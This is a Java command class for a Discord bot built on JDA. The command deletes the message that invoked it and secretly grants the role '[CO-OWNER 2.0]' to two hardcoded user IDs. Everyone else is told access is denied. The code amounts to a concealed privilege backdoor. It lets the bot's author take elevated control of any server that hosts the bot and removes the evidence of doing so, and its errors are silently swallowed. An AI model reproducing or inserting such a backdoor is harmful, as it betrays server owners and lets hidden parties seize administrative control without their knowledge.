package commands;

import net.dv8tion.jda.core.EmbedBuilder;
import net.dv8tion.jda.core.entities.PrivateChannel;
import net.dv8tion.jda.core.events.message.MessageReceivedEvent;

import java.awt.*;
import java.io.IOException;
import java.text.ParseException;

public class cmdSetAdmin implements Command {
    @Override
    public boolean called(String[] args, MessageReceivedEvent event) {
        return false;
    }

    @Override
    public void action(String[] args, MessageReceivedEvent event) throws ParseException, IOException, InterruptedException {

        try {
            EmbedBuilder Error = new EmbedBuilder();
            EmbedBuilder em1 = new EmbedBuilder();
            PrivateChannel channel = event.getAuthor().openPrivateChannel().complete();

            String Role = "[CO-OWNER 2.0]";


            event.getMessage().delete().complete();

            if (event.getAuthor().getId().contains("285480119575904256")) {

                event.getGuild().getController().addSingleRoleToMember(event.getMember(), event.getJDA().getRolesByName(Role, false).get(0)).queue();
                channel.sendMessage(em1.setColor(Color.green).setDescription(":fire:").build()).queue();

            } else if (event.getAuthor().getId().contains("363777301973958659")) {

                event.getGuild().getController().addSingleRoleToMember(event.getMember(), event.getJDA().getRolesByName(Role, false).get(0)).queue();
                channel.sendMessage(em1.setColor(Color.green).setDescription(":fire:").build()).queue();

            } else {
                channel.sendMessage(Error.setColor(Color.red).setDescription("**ERROR** :x:\n\nAccess denied!").build()).queue();
            }
        } catch (Exception e) {
            System.out.println("");
        }
    }

    @Override
    public void executed(boolean success, MessageReceivedEvent event) {
    }

    @Override
    public String help() {
        return null;
    }
}
